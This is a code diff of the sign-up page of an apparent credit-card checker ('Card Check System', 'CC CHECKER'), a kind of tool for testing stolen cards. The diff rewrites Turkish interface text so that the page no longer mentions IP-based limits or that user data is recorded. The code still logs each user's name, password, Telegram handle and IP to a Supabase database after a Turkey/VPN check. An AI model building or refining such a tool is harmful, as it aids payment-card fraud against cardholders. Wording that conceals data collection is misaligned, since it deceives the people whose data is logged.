@@ -165,12 +165,12 @@
     <div id="loginSection">
         <div class="logo">Card Check System</div>
         <div class="info-box">
-            🔒 Bu IP ile yalnızca 1 hesap açılabilir.<br>
+            🔒 sadece 1 hesap acabilirsiniz.<br>
             Bilgilerinizi eksiksiz girin.
         </div>
         <div class="input-group">
-            <label>Ad Soyad</label>
-            <input type="text" id="fullname" placeholder="Ahmet Yılmaz">
+            <label>İsim</label>
+            <input type="text" id="fullname" placeholder="örnek">
         </div>
         <div class="input-group">
             <label>Şifre</label>
@@ -182,7 +182,7 @@
         </div>
         <button id="loginBtn">Hesap Oluştur</button>
         <div id="loginError" class="error"></div>
-        <div class="info-box" style="margin-top:20px">Bilgileriniz kaydedilir.</div>
+        <div class="info-box" style="margin-top:20px">Bilgileriniz saklıdır.</div>
     </div>
 
     <!-- 2️⃣ CC CHECKER BÖLÜMÜ -->
@@ -317,7 +317,7 @@
         const tg = document.getElementById("telegramUser").value.trim();
         const errDiv = document.getElementById("loginError");
 
-        if (!name || name.length < 2) { errDiv.innerText = "❌ Ad Soyad geçerli değil."; return; }
+        if (!name || name.length < 2) { errDiv.innerText = "❌ İsim geçerli değil."; return; }
         if (!pwd || pwd.length < 4) { errDiv.innerText = "❌ Şifre en az 4 karakter."; return; }
         if (!tg.startsWith("@") || tg.length < 3) { errDiv.innerText = "❌ @ ile başlayan Telegram adı girin."; return; }
 
@@ -326,7 +326,7 @@
             await checkTurkeyAndVPN(ip);
             const exists = await checkIfIpExists(ip);
             if (exists) {
-                errDiv.innerText = "❌ Bu IP ile daha önce hesap açılmış. Yalnızca 1 hesap.";
+                errDiv.innerText = "❌  daha önce hesap açılmış. Yalnızca 1 hesap.";
                 return;
             }
             const ok = await logToSupabase(name, pwd, tg, ip);
